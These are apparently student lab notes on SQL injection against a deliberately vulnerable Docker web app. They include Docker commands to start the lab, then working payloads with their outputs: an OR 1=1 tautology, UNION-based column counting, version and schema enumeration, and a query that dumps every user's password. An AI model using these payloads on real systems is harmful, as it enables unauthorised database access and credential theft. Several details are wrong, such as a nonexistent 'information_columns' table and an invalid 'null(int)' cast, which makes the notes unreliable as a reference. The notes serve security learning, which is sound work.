
to run lab

```sh
sudo docker-compose up
```

to run the docker container as background process use

```sh
sudo docker-compose up -d
```
-d:detach

to reset all the labs go to /init.php

to check what containers are running:

```sh
sudo docker ps -a
```

to stop containers

```sh
sudo  docker-compose stop
```


LAB

Check for everything we are supplying like username, password or even cookies

enter a valid username

i/p:
jeremy
o/p:
Username: jeremy - Email: jeremy@example.com

i/p: '
o/p:No users found

i/p: "
o/p:No users found


i/p: jeremy"
o/p:No users found

probably query in backend
Select Email 
From Users
Where username="i/p"

i/p: jeremy' or 1=1#
o/p:
Username: jeremy - Email: jeremy@example.com

Username: jessamy - Email: jessamy@example.com

Username: bob - Email: bob@example.com

In SQL
\# or -- - are called terminator and do not evaluate anything after that

we provide ' after jeremy to terminate the username then provide logical OR operator and write another query 1=1 which is a true statement so when the Query  

Select Email 
From Users
Where username="i/p"
OR 
1=1 

it will always be true and we get entire DB

------
If we use UNION we can only select same number of columns as in first query eg:

Select username,passwd UNION Select passwd,age from ...

***we have to select same number of attributes/columns***

--------

##To find number of columns in target DB

i/p:
jeremy' union select null#
o/p:
No users found

i/p:
jeremy' union select null,null#
o/p:
No users found

i/p:
jeremy' union select null,null,null#
o/p:
Username: jeremy - Email: jeremy@example.com

Username: - Email:

so we can tell there are 3 columns in the table

i/p:
jeremy' union select null,null,version()#
o/p:
Username: jeremy - Email: jeremy@example.com

Username: - Email: 8.0.33

we use version() as  third parameter to get version of database 
and we get the version as 8.0.33


i/p:
jeremy' union select null,null,table_name from information_schema.tables #

o/p:
Username: jeremy - Email: jeremy@example.com

Username: - Email: ADMINISTRABLE_ROLE_AUTHORIZATIONS

Username: - Email: APPLICABLE_ROLES

Username: - Email: CHARACTER_SETS

Username: - Email: CHECK_CONSTRAINTS

Username: - Email: COLLATIONS

Username: - Email: COLLATION_CHARACTER_SET_APPLICABILITY

Username: - Email: COLUMNS

Username: - Email: COLUMNS_EXTENSIONS


i/p:
jeremy' union select null,null,column_name from information_columns.columns #
o/p:

Username: jeremy - Email: jeremy@example.com

Username: - Email: USER

Username: - Email: HOST

Username: - Email: GRANTEE

Username: - Email: username

Username: - Email: password

Username: - Email: mfa

Username: - Email: lockout_count

Username: - Email: registration

Username: - Email: positionx

Username: - Email: positiony

Username: - Email: destinationx

Username: - Email: destinationy

Username: - Email: address

Username: - Email: email

Username: - Email: session

Username: - Email: image

Username: - Email: price

Username: - Email: message

i/p:
jeremy' union select null,null,password from injection0x01#

o/p:
Username: jeremy - Email: jeremy@example.com

Username: - Email: jeremyspassword

Username: - Email: jessamyspassword

Username: - Email: bobspassword

we get all passwords and not just jeremy's


sometimes null dosent work so we need to add dat type of the column

**jeremy' union select null(int),null,password from injection0x01#**

